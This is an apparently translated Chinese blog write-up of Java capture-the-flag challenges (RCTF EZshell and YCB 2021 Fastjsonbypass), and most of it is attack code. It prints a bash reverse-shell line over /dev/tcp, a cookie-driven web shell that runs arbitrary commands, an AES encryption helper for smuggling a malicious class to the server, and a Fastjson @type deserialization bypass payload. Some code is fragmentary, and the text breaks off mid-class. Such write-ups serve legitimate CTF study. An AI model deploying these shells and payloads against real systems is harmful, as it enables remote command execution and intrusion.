# java ctf题
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 记录一下最近的一些java题。。。。
## RCTF-EZshell
有一说一，这个题目应该是web…..
题目给了一个war包，非常明显是通过tomcat搭建。
为了方便我转换成了springboot项目。项目：
其实非常简单。。。
就我们写一个恶意类，然后继续aes加密然后在base64加密之后让服务端继续解密然后加载执行就欧克。。
最开始自己是写的静态代码，因为静态代码实例化的时候要执行，然后就可以执行命令。
    try{
        Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat &5 >&5; done"});
    }catch (IOException e){
        try{
            Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
        }catch (IOException ee){
        }
    }
然后在aes加密，这里是中中给的脚本，而且只能在mac上生成有效果？？？
     0) {
                for (Cookie cookie : cookies) {
                    if ("cmd".equals(cookie.getName()))
                        cmd = cookie.getValue();
                }
            }
            try{
                Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
                InputStream is = p.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String line;
                while ((line = reader.readLine()) != null) {
                    //String encode = new BASE64Encoder().encode(line.getBytes("UTF-8"));
                    //System.out.println(encode);
                    httpServletResponse.getWriter().write(line);
                }
            }catch (IOException e){
                try{
                    Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});
                    InputStream is = p.getInputStream();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        //String encode = new BASE64Encoder().encode(line.getBytes("UTF-8"));
                        //System.out.println(encode);
                        httpServletResponse.getWriter().write(line);
                    }
                }catch (IOException ee){
                }
            }
        }
    }
通过Cookie: cmd=whoami执行命令。。
总体上来说还是有意思。。。
下面是直接搭建的环境。并且通过java实现aes加密
    package com.firebasky.ezshell.exp;
    import javax.crypto.Cipher;
    import javax.crypto.SecretKey;
    import javax.crypto.spec.SecretKeySpec;
    import java.io.File;
    import java.io.FileInputStream;
    import java.util.Arrays;
    import java.util.Base64;
    public class AES {
        public static void main(String[] args) throws Exception {
            byte[] string = readFile("路径\\cmd.class");
            String k = "ZTQ1ZTMyOWZlYjVkOTI1Yg==";//key 密钥e45e329feb5d925b
            String encrypt = encrypt(k, string);
            System.out.println(encrypt);
        }
        public static byte[] readFile(String path) throws Exception {
            File file = new File(path);
            FileInputStream inputFile = new FileInputStream(file);
            byte[] buffer = new byte[(int)file.length()];
            inputFile.read(buffer);
            inputFile.close();
            return buffer;
        }
        public static String encrypt(final String secret, final byte[] data) {
            byte[] decodedKey = Base64.getDecoder().decode(secret);
            try {
                Cipher cipher = Cipher.getInstance("AES");
                // rebuild key using SecretKeySpec
                SecretKey originalKey = new SecretKeySpec(Arrays.copyOf(decodedKey, 16), "AES");
                cipher.init(Cipher.ENCRYPT_MODE, originalKey);
                byte[] cipherText = cipher.doFinal(data);
                return Base64.getEncoder().encodeToString(cipherText);
            } catch (Exception e) {
                throw new RuntimeException(
                        "Error occured while encrypting data", e);
            }
        }
        public static String decrypt(final String secret, final String encryptedString) {
            byte[] decodedKey = Base64.getDecoder().decode(secret);
            try {
                Cipher cipher = Cipher.getInstance("AES");
                // rebuild key using SecretKeySpec
                SecretKey originalKey = new SecretKeySpec(Arrays.copyOf(decodedKey, 16), "AES");
                cipher.init(Cipher.DECRYPT_MODE, originalKey);
                byte[] cipherText = cipher.doFinal(Base64.getDecoder().decode(encryptedString));
                return new String(cipherText);
            } catch (Exception e) {
                throw new RuntimeException(
                        "Error occured while decrypting data", e);
            }
        }
    }
## YCB-Fastjsonbypass
参考ycb 2021 搭建的环境。。。
分享自己fork的项目：
    {
    "keyword": 
        {"$ref": "$r2.message"}, 
    "msg": 
        {
            "\u0040\u0074\u0079\u0070\u0065":"java.lang.Exception",
            "\u0040\u0074\u0079\u0070\u0065": "com.firebasky.fastjsonbypass.Exception.MyException"
        }
    }
写文件参考：[https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247484413&idx=1&sn=1e6e6dc310896678a64807ee003c4965&scene=21#wechat_redirect](https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247484413&idx=1&sn=1e6e6dc310896678a64807ee003c4965&scene=21#wechat_redirect)
因为自己本地环境是win，而且jdk的8u201不支持这样的方法.所以使用其他方法。
    import java.io.IOException;
    public class Cmd implements AutoCloseable{